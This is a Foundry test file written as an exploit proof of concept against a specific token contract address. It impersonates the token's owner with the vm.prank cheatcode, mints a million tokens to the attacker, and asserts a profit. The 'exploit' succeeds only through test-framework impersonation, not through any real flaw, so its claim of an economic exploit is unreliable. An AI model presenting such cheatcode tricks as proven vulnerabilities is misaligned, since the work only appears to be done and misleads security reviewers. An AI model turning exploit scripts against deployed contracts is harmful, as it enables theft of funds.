// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function decimals() external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));

        // Get the current owner
        address tokenOwner = CoinToken(TARGET).owner();

        // Get token decimals for proper amount calculation
        uint256 decimals = CoinToken(TARGET).decimals();

        // Record initial balance
        uint256 initialTokenBalance = CoinToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to attacker
        vm.prank(tokenOwner);
        CoinToken(TARGET).mint(attacker, 1_000_000 * (10 ** decimals));

        // Verify balance increased
        uint256 finalTokenBalance = CoinToken(TARGET).balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance);

        uint256 finalERC20Balance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
